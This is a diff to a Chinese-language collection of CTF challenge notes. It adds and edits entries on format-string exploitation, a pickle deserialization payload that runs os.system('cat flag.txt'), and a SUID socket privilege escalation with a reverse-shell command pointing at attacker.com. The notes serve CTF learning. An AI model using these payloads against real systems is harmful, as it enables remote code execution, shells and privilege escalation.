@@ -625,7 +625,7 @@ chain.puts(file.bss()) #puts输出内容
 - 对于爆破的题目，可能很难找到切interactive的时机。保险起见，可以直接在pwntools里发送cat flag之类的命令，然后接收就好了
 - 格式化字符串漏洞题基本两次printf就够了。一次泄露地址，一次将one gadget写入返回地址。做法很多，改got表也行，但第一次漏洞的泄露地址是必须的。
 71. [Irreductible](https://github.com/deyixtan/ctf/tree/main/challenges/hero-ctf-2023/misc-irreductible)
-- 不使用`__reduce__`函数的pickle反序列化rce：https://heartathack.club/blog/pickle-RCE-without-reduce
+- 不使用`__reduce__`函数的python pickle反序列化rce：https://heartathack.club/blog/pickle-RCE-without-reduce
     - 使用OBJ：
 ```python
 >>> payload_obj
@@ -649,3 +649,12 @@ b'(S"cat flag.txt"\nios\nsystem\n.'
    28: .    STOP
 #hex:28532263617420666c61672e747874220a696f730a73797374656d0a2e
 ```
+72. [SUDOkLu](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#sudoklu)
+- 利用具有SUID（`sudo -l`查看）的socket命令提权：https://gtfobins.github.io/gtfobins/socket/ 。反弹shell payload：
+```sh
+RHOST=attacker.com
+RPORT=12345
+socket -qvp '/bin/sh -i' $RHOST $RPORT
+```
+也可以将RHOST写为`0.0.0.0`，直接把shell弹到题目机器上，无需自己的公网ip。
+- [GTFOBins](https://gtfobins.github.io/)，记录了很多利用错误配置binary提权的payload。
